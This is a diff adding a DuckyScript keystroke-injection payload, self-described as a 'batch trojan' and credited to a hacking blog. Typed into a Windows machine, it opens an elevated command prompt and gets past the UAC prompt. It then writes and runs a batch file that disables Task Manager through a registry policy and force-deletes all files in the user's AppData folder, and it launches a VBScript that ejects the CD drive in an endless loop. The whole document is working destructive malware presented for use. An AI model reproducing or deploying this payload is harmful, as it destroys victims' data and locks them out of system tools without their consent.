@@ -1,0 +1,69 @@
+REM A BATCH TROJAN SOURCE CODE 
+REM cmd 
+REM https://hacknetbite.blogspot.com
+REM windows r key
+DELAY 1000
+WINDOWS R
+DELAY 750
+STRING cmd
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 750 
+LEFT
+DELAY 100
+ENTER
+REM SOURCE CODE HERE ====>
+DELAY 750
+STRING @echo off
+ENTER
+STRING echo @echo off >> %userprofile%\ducky.bat
+ENTER
+STRING echo REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >> %userprofile%\ducky.bat
+ENTER
+STRING echo REM %appdata%\ >> %userprofile%\ducky.bat
+ENTER
+STRING echo @del %appdata%\*.* /F /Q >> %userprofile%\ducky.bat
+ENTER
+STRING echo timeout 1 >> %userprofile%\ducky.bat
+ENTER
+STRING echo Set oWMP = CreateObject("WMPlayer.OCX.7") >>%userprofile%\x.vbs
+ENTER
+STRING echo Set colCDROMs = oWMP.cdromCollection >>%userprofile%\x.vbs
+ENTER
+STRING echo do >>%userprofile%\x.vbs
+ENTER
+STRING echo if colCDROMs.Count >= 1 then >>%userprofile%\x.vbs
+ENTER
+STRING echo For i = 0 to colCDROMs.Count - 1 >>%userprofile%\x.vbs
+ENTER
+STRING echo colCDROMs.Item(i).Eject >>%userprofile%\x.vbs 
+ENTER
+STRING echo Next >>%userprofile%\x.vbs
+ENTER
+STRING echo For i = 0 to colCDROMs.Count - 1 >>%userprofile%\x.vbs
+ENTER
+STRING echo colCDROMs.Item(i).Eject >>%userprofile%\x.vbs
+ENTER 
+STRING echo Next >>%userprofile%\x.vbs
+ENTER
+STRING echo End If >>%userprofile%\x.vbs
+ENTER
+STRING echo wscript.sleep 5000 >>%userprofile%\x.vbs
+ENTER
+STRING echo loop >>%userprofile%\x.vbs
+ENTER
+STRING echo start "" %userprofile%\x.vbs >> %userprofile%\ducky.bat
+ENTER
+DELAY 250
+ALT F4
+DELAY 750
+GUI r
+DELAY 450 
+STRING %userprofile%\ducky.bat
+DELAY 200
+CONTROL SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 200
+ENTER
+
